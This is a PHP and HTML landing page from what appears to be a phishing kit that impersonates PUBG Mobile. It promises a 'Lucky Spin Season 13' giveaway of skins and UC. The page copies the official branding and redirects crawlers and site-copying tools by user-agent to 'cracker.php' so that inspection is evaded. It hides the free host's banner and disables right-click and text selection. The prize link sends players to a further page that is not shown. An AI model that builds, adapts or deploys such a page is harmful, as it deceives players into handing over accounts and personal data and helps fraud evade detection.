<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
        <style>img[alt="www.000webhost.com"]{display:none;}</style>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-mask">

<div class="navbar">
<div class="navbar-btn-wrapper">
<button class="navbar-btn">
Purchase</button>
<button class="navbar-btn">
Download</button>
</div>
<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<span>OFFICIAL PUBG ON MOBILE</span>
</div>
</div>

<div class="content">
<img class="logo" src="img/season.png">
<div class="txt-season">
Lucky Spin Season 13
</div> <!--- txt season --->
<div class="txt-season-slogan">
Toy Playground Edition
</div> <!--- txt season slogan --->

<div class="divider">
<span>CLick And Select Rewards below</span>
</div>

<div class="menu-home" onclick="location.href='./../luckyspin.php'">
<i class="zmdi zmdi-chevron-right zmdi-hc-3x"></i>
<img src="https://www.pubgmobile.com/en/event/royalepass13/images/kv2_icon.png">
<div class="menu-home-txt">
Lucky Spin Season 13
</div>
<div class="menu-home-txt-description">
You will get prizes such as outfits, weapon skin and uc
</div>
</div> <!--- menu home --->
</div> <!--- content --->
</div> <!--- container mask --->
</div> <!--- container --->